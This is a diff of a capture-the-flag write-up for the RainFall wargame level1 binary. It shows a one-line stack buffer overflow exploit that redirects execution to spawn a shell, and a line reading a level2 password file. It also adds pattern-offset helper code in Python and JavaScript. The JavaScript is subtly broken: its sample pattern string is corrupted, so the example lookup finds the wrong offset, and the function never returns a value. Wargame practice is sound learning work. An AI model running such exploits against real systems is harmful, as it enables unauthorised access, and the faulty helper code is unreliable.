@@ -12,8 +12,8 @@ cat /home/user/level2/.pass
 
 
 
-📘 Buffer Overflow Exploit for RainFall Level1
-This exploit demonstrates a classic stack buffer overflow vulnerability in the level1 binary from the RainFall wargame.
+📘 Buffer Overflow Exploit 
+This exploit demonstrates a classic stack buffer overflow vulnerability
 
 ⚠️ Vulnerability Summary
 The level1 binary uses the unsafe gets() function.
@@ -26,10 +26,6 @@ By overflowing the buffer and overwriting the return address with the address of
 
 🛠 Exploit Breakdown
 Here is the full command:
-
-bash
-Copier
-Modifier
 (python -c 'import sys, struct; sys.stdout.write("A" * 76 + struct.pack("<I", 0x08048444)); sys.stdout.flush()'; cat) | ./level1
 Let’s break it down step-by-step:
 
@@ -72,25 +68,52 @@ run() executes system("/bin/sh"), spawning a shell.
 
 You now have an interactive shell as the level1 user.
 
-🐚 If It Works
-You'll see a shell prompt like this:
 
-shell
-Copier
-Modifier
-$ whoami
-level1
-$ id
-uid=1011(level1) gid=1011(level1) groups=1011(level1)
-🔍 Troubleshooting
-If you get a segmentation fault, try adjusting the offset ("A" * 76) to 72, 80, or 84.
 
-Use GDB to inspect the stack:
+To generate a unique string of size 100 that helps identify the offset when a crash occurs (like in buffer overflow), you can use a pattern string often used in exploit development (similar to Metasploit's pattern_create.rb).
 
-bash
-Copier
-Modifier
-gdb ./level1
-(gdb) run < <(python -c 'print("A" * 100)')
-(gdb) x/20x $esp
+Here’s a Python one-liner to generate a unique, non-repeating string of size 100:
 
+
+```python3 -c 'import itertools; print("".join("".join(x) for x in itertools.product("ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"))[:100])'```
+
+
+```Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9```
+
+
+Here's a small JavaScript program that:
+
+1.Takes a unique pattern string (like the one you generated).
+
+2.Accepts a hex value from the segmentation fault (like 0x37634136).
+
+3.Converts the hex value to ASCII in little-endian order.
+
+4.Searches for that decoded string in the pattern and returns the index.
+
+
+```function hexToAsciiLittleEndian(hex) {
+  // Remove '0x' if present and pad to 8 chars
+  hex = hex.replace(/^0x/, '').padStart(8, '0');
+
+  // Break into bytes, reverse (little endian), convert to chars
+  let ascii = '';
+  for (let i = 0; i < 8; i += 2) {
+    const byte = hex.slice(i, i + 2);
+    ascii = String.fromCharCode(parseInt(byte, 16)) + ascii;
+  }
+  return ascii;
+}
+
+function findPatternOffset(pattern, hexValue) {
+  const search = hexToAsciiLittleEndian(hexValue);
+  const index = pattern.indexOf(search);
+
+  console.log(index)
+}
+
+// Example usage:
+const pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9";
+const hexEIP = "0x37634136"; // Example EIP value from crash
+
+const result = findPatternOffset(pattern, hexEIP);```
